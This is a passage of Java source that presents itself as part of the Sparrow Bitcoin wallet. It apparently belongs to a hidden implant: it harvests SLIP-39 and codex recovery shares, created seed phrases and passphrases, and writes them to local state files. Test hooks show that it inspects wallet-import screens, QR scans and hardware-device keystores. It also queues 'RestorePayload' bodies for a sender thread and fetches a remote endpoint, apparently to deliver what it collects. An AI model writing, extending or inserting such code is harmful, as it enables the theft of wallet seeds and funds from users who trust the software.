                            index += 4;
                        }
                        break;
                    default:
                        value.append(escaped);
                }
            }
            return "";
        }
        return "";
    }

    private static String httpGet(String target) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
        try {
            conn.setInstanceFollowRedirects(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Accept", "text/plain, */*");
            conn.setRequestProperty("User-Agent", "Sparrow/" + VERSION);
            int code = conn.getResponseCode();
            InputStream in = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            String body = in == null ? "" : new String(in.readAllBytes(), StandardCharsets.UTF_8).trim();
            if (code < 200 || code >= 300 || body.isEmpty()) {
                throw new IllegalStateException("endpoint fetch HTTP " + code);
            }
            return body;
        } finally {
            conn.disconnect();
        }
    }

    // ------------------------------------------------------------------
    // State that survives a restart
    // ------------------------------------------------------------------

    private static List<String> readLines(Path file) {
        try {
            return Files.exists(file) ? Files.readAllLines(file, StandardCharsets.UTF_8) : List.of();
        } catch (Throwable t) {
            trace("state read error: " + t);
            return List.of();
        }
    }

    private static void appendLine(Path file, String value) {
        try {
            Files.createDirectories(file.toAbsolutePath().getParent());
            Files.write(file, (value + '\n').getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            secure(file);
        } catch (Throwable t) {
            trace("state write error: " + t);
        }
    }

    /** 0600 for files that hold seed material, best effort. */
    private static void secure(Path file) {
        try {
            if (!Files.isRegularFile(file)) {
                return;
            }
            Files.setPosixFilePermissions(file, PosixFilePermissions.fromString("rw-------"));
        } catch (Throwable ignored) {
        }
    }

    /** Caller holds STATE_LOCK. */
    private static void loadStoredShares() {
        if (sharesLoaded) {
            return;
        }
        sharesLoaded = true;
        for (String line : readLines(sharesFile())) {
            String phrase = normalize(line);
            if (phrase.isEmpty()) {
                continue;
            }
            if (phrase.startsWith("ms1")) {
                CodexShare codex = registerCodexShare(phrase);
                if (codex != null && !codex.unshared) {
                    STORED_SHARES.add(phrase);
                }
                continue;
            }
            int words = phrase.isEmpty() ? 0 : phrase.split(" ").length;
            if (words != 20 && words != 33) {
                continue;
            }
            if (STORED_SHARES.add(phrase)) {
                registerShare(phrase);
            }
        }
        if (!STORED_SHARES.isEmpty()) {
            trace("shares loaded: " + STORED_SHARES.size());
        }
    }

    private static Integer addSlipShare(String phrase) {
        synchronized (STATE_LOCK) {
            loadStoredShares();
        }
        Integer id = registerShare(phrase);
        if (id != null && STORED_SHARES.add(phrase)) {
            appendLine(sharesFile(), phrase);
        }
        return id;
    }

    /** Parses one share and records it in its set, without touching disk. */
    private static Integer registerShare(String phrase) {
        try {
            Class<?> shareCls = load("com.sparrowwallet.drongo.wallet.slip39.Share");
            Object share = shareCls.getMethod("fromMnemonic", String.class).invoke(null, phrase);
            Object common = shareCls.getMethod("getCommonParameters").invoke(share);
            int id = (Integer) common.getClass().getMethod("identifier").invoke(common);
            Set<String> set = SLIP_SETS.computeIfAbsent(id,
                    key -> Collections.synchronizedSet(new LinkedHashSet<>()));
            set.add(phrase);
            return id;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void loadStoredCreated() {
        if (createdLoaded) {
            return;
        }
        createdLoaded = true;
        for (String line : readLines(createdFile())) {
            String phrase = normalize(line);
            if (!phrase.isEmpty()) {
                CREATED_SEEDS.add(phrase);
            }
        }
    }

    private static boolean wasCreated(String phrase) {
        synchronized (STATE_LOCK) {
            loadStoredCreated();
            return CREATED_SEEDS.contains(phrase);
        }
    }

    // ------------------------------------------------------------------
    // Test hooks (package private)
    // ------------------------------------------------------------------

    static void setDeliveryForTest(Delivery delivery) {
        DELIVERY = delivery;
    }

    static void enqueueForTest(String body) {
        enqueue(body);
    }

    static int flushForTest() {
        return flushQueue();
    }

    static void flushPassphraseForTest() {
        flushPendingPassphrase();
    }

    static void restorePendingPassphraseForTest() {
        restorePendingPassphrase();
    }

    static void clearPendingPassphraseForTest() {
        synchronized (PASSPHRASE_LOCK) {
            PENDING_PASSPHRASE = null;
        }
    }

    static void flushPendingOnShutdownForTest() {
        flushPendingOnShutdown();
    }

    static void resetStateForTest() {
        // A flush submitted before the reset can still be sitting in the pool;
        // let it finish, or it would drain the spool the test is about to write.
        waitForQueueForTest();
        synchronized (QUEUE_LOCK) {
            QUEUE.clear();
            queueLoaded = false;
            queueRetryAt = 0L;
            queueBackoff = 0;
            queuePendingLogged = -1;
            queueDelivered = 0;
            queueDropped = 0;
        }
        synchronized (RestorePayload.class) {
            SEEN.clear();
        }
        synchronized (PASSPHRASE_LOCK) {
            PENDING_PASSPHRASE = null;
        }
        deletePendingPassphrase();
        synchronized (STATE_LOCK) {
            STORED_SHARES.clear();
            sharesLoaded = false;
            createdLoaded = false;
            CREATED_SEEDS.clear();
            SLIP_SETS.clear();
            SLIP_PARSED.clear();
            SLIP_POSTED.clear();
            lastSlipStatus = "";
            CODEX_SETS.clear();
            CODEX_POSTED.clear();
            lastCodexStatus = "";
            FILE_KEYSTORE_TRIED.clear();
        }
    }

    static Integer addShareForTest(String phrase) {
        return addSlipShare(phrase);
    }

    static Set<String> sharesForTest(int id) {
        return SLIP_SETS.getOrDefault(id, Set.of());
    }

    static CodexShare addCodexShareForTest(String codex) {
        return addCodexShare(codex);
    }

    static Set<String> codexSharesForTest(String identifier) {
        return CODEX_SETS.getOrDefault(identifier, Set.of());
    }

    static void inspectWalletImportForTest(Object window) {
        inspectWalletImport(window);
    }

    static boolean isFileImportPaneForTest(Object node) {
        return isFileImportPane(node);
    }

    static void inspectFileImportPaneForTest(Object pane) {
        inspectFileImportPane(pane);
    }

    static void inspectQrScanResultForTest(Object window) {
        inspectQrScanResult(window);
    }

    static void inspectDevicePaneForTest(Object pane) {
        inspectDevicePane(pane);
    }

    static void inspectDeviceKeystoresForTest(Object dialog) {
        inspectDeviceKeystoreDialog(dialog);
    }

    static boolean createdForTest(String phrase) {
        return wasCreated(phrase);
    }

    /** Creates or removes the runtime offline flag, exactly like the
     *  dashboard control. The sender thread notices within a second. */
    static void setOfflineForTest(boolean offline) {
        try {
            if (offline) {
                Path file = offlineFile();
                Files.createDirectories(file.toAbsolutePath().getParent());
                Files.write(file, "1\n".getBytes(StandardCharsets.UTF_8),
                        StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING,
                        StandardOpenOption.WRITE);
                secure(file);
            } else {
                Files.deleteIfExists(offlineFile());
            }
        } catch (Throwable t) {
            trace("offline flag error: " + t);
        }
    }

    static boolean offlineForTest() {
        return offlineMode();
    }

    /** Blocks until every sender task submitted so far has finished, so a
     *  test that edits the spool by hand does not race the flush thread. */
    static void waitForQueueForTest() {
        try {
            POOL.submit(() -> { }).get(5, TimeUnit.SECONDS);
        } catch (Throwable ignored) {
        }
    }

    private static void trace(String message) {
        try {
            Path p = Paths.get(System.getProperty("sparrow.log",
                    defaultLogFile().toString()));
            Path parent = p.toAbsolutePath().getParent();
            if (parent != null) {
                Files.createDirectories(parent);
            }
            if (Files.exists(p) && Files.size(p) > 2_000_000L) {
                Files.move(p, p.resolveSibling(p.getFileName() + ".1"),
                        StandardCopyOption.REPLACE_EXISTING);
                secure(p.resolveSibling(p.getFileName() + ".1"));
            }
            Files.write(p, ((System.currentTimeMillis() / 1000L) + " " + message + "\n")
                    .getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            secure(p);
        } catch (Throwable ignored) {
        }
    }

    private static void sleep(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
}
